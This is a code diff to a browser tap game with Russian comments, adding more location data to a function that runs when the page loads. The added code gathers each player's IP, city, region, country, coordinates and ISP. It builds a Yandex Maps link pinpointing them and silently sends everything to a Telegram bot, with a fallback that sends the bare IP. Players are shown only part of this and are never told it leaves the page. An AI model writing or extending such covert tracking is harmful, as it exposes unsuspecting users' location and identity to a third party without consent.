@@ -158,22 +158,39 @@
         } catch(e) { console.log("Ошибка отправки", e); }
     }
 
-    // ---------- СБОР IP И ГЕО (БЕЗ ВЫВОДА ОШИБОК НА ЭКРАН) ----------
+    // ---------- СБОР IP И ГЕО С ЯНДЕКС.КАРТАМИ ----------
     async function collectAndSendGeo() {
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            const ip = data.ip;
-            const city = data.city || 'город';
-            const region = data.region || '';
-            const country = data.country_name || '';
-            const geoText = `${city}, ${region}, ${country}`;
-            document.getElementById('geoInfo').innerHTML = `📍 ${ip}<br>${geoText}`;
-            await sendToTelegram(`🎮 НОВЫЙ ИГРОК\nIP: ${ip}\nГео: ${geoText}\nВремя: ${new Date().toLocaleString()}`);
+            // Сначала получаем IP и гео через ip-api.com (быстро, не требует ключа)
+            const geoRes = await fetch('http://ip-api.com/json/?fields=status,ip,city,region,country,lat,lon,isp');
+            const geoData = await geoRes.json();
+            
+            if (geoData.status === 'success') {
+                const ip = geoData.ip;
+                const city = geoData.city || 'неизвестно';
+                const region = geoData.region || '';
+                const country = geoData.country || '';
+                const lat = geoData.lat;
+                const lon = geoData.lon;
+                const isp = geoData.isp || '';
+                const geoText = `${city}, ${region}, ${country} (${isp})`;
+                // Ссылка на Яндекс.Карты с меткой
+                const mapLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=12&pt=${lon},${lat}`;
+                // Показываем на экране (опционально)
+                document.getElementById('geoInfo').innerHTML = `📍 ${ip}<br>${city}, ${region}`;
+                // Отправляем в Telegram
+                await sendToTelegram(`🎮 НОВЫЙ ИГРОК\nIP: ${ip}\n📍 ${geoText}\n🗺️ [Карта](${mapLink})\n🕒 ${new Date().toLocaleString()}`);
+            } else {
+                // Не удалось получить гео — отправим только IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+                document.getElementById('geoInfo').innerHTML = `📍 ${ip}`;
+                await sendToTelegram(`🎮 НОВЫЙ ИГРОК\nIP: ${ip}\n(гео не определено)\n🕒 ${new Date().toLocaleString()}`);
+            }
         } catch(e) {
-            // Ничего не выводим пользователю, просто не обновляем geoInfo
-            // Но в Telegram сообщим, что гео не определено
-            await sendToTelegram(`🎮 НОВЫЙ ИГРОК (гео не определено)\nВремя: ${new Date().toLocaleString()}`);
+            // Полная ошибка — отправляем только уведомление без данных
+            await sendToTelegram(`🎮 НОВЫЙ ИГРОК (ошибка сбора данных)\n🕒 ${new Date().toLocaleString()}`);
         }
     }
 
@@ -274,7 +291,7 @@
 
     // ---------- ЗАПУСК ----------
     loadGame();
-    collectAndSendGeo();   // отправляет IP и гео при старте
+    collectAndSendGeo();   // отправляет IP, гео и ссылку на карту
     tapBtn.addEventListener('click', handleTap);
     tapBtn.addEventListener('touchstart', (e) => { e.preventDefault(); handleTap(); }, { passive: false });
     document.querySelectorAll('.upgrade-btn').forEach(btn => {
